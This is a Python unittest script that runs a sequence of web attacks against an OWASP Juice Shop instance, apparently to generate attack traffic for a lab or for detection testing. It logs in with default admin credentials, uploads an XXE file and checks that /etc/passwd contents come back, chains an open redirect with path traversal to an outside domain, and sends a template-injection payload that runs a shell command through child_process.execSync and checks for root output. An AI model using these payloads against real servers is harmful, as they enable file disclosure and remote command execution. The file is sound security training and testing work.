import json
import os
import random
import requests as r
import time
import unittest

juice_url = os.getenv("JUICE_URL")

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": f"{juice_url}/",
    "Connection": "keep-alive",
    "Referer": f"{juice_url}/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}


class TestInjections(unittest.TestCase):
    def test_b2b_xxe(self):
        login = {"email": "admin@juice-sh.op", "password": "admin123"}

        res = r.post(f"{juice_url}/rest/user/login", headers=headers, json=login)
        token = json.loads(res.text.strip())["authentication"]["token"]

        admin_headers = headers
        admin_headers["Authorization"] = f"Bearer {token}"
        admin_headers["Cookie"] = f"token={token}"
        time.sleep(random.random() + random.randint(2, 4))

        with open("/root/tests/data/xxe.xml", "rb") as infile:
            res = r.post(
                f"{juice_url}/file-upload",
                files={"file": infile},
                headers=admin_headers,
            )
        self.assertIn("root:x:0:0:root:/root", res.text)

    def test_open_redirect_path_traversal(self):
        res = r.get(f"{juice_url}/redirect?to=https://github.com/juice-shop/juice-shop")
        time.sleep(random.random() + random.randint(3, 5))

        login = {"email": "jim@juice-sh.op", "password": "ncc-1701"}

        res = r.post(f"{juice_url}/rest/user/login", headers=headers, json=login)
        token = json.loads(res.text.strip())["authentication"]["token"]

        auth_headers = headers
        auth_headers["Authorization"] = f"Bearer {token}"
        auth_headers["Cookie"] = f"token={token}"
        time.sleep(random.random() + random.randint(2, 4))

        r.get(f"{juice_url}/#/deluxe-membership", headers=auth_headers)
        r.get(f"{juice_url}/main.js", headers=auth_headers)
        time.sleep(random.random() + random.randint(10, 20))

        r.get(
            f"{juice_url}/#/deluxe-membership?testDecal=test",
            headers=auth_headers,
        )
        time.sleep(random.random() + random.randint(4, 6))

        r.get(
            f"{juice_url}/#/deluxe-membership?testDecal=..%2F..%2F..%2Ftest",
            headers=auth_headers,
        )
        time.sleep(random.random() + random.randint(5, 10))

        # I wish there was a way to replace the placekitten domain with something that seemed like a URL to a
        # C2 domain but can't really do that when this is connected to the open internet. I would use the attacker box's
        # IP but that's not really good tradecraft.
        res = r.get(
            f"{juice_url}/http://localhost:3000/#/deluxe-membership?testDecal=..%2F..%2F..%2F..%2Fredirect%3Fto%3Dhttps:%2F%2Fplacekitten.com%2Fg%2F400%2F500%3Fx%3Dhttps:%2F%2Fgithub.com%2Fbkimminich%2Fjuice-shop"
        )
        self.assertIn("redirect?to=https://placekitten.com", res.text)

    def test_profile_ssti(self):
        reg_data = {
            "email": "tester@juice-sh.op",
            "password": "password",
            "passwordRepeat": "password",
            "securityQuestion": {
                "id": 1,
                "question": "Your eldest siblings middle name?",
                "createdAt": "2023-07-31T14:28:06.726Z",
                "updatedAt": "2023-07-31T14:28:06.726Z",
            },
            "securityAnswer": "bob",
        }
        res = r.post(f"{juice_url}/api/Users/", headers=headers, json=reg_data)

        login = {"email": "tester@juice-sh.op", "password": "password"}

        res = r.post(f"{juice_url}/rest/user/login", headers=headers, json=login)
        token = json.loads(res.text.strip())["authentication"]["token"]

        auth_headers = headers
        auth_headers["Authorization"] = f"Bearer {token}"
        auth_headers["Cookie"] = f"token={token}"
        time.sleep(random.random() + random.randint(2, 4))

        r.get(f"{juice_url}/profile", headers=auth_headers)
        time.sleep(random.random() + random.randint(2, 4))
        r.post(
            f"{juice_url}/profile",
            headers=auth_headers,
            data={"username": "#{1+1}"},
        )
        time.sleep(random.random() + random.randint(2, 4))
        res = r.post(
            f"{juice_url}/profile",
            headers=auth_headers,
            data={
                "username": "#{global.process.mainModule.require('child_process').execSync('id')}"
            },
        )
        self.assertIn("uid=0(root) gid=0(root)", res.text)
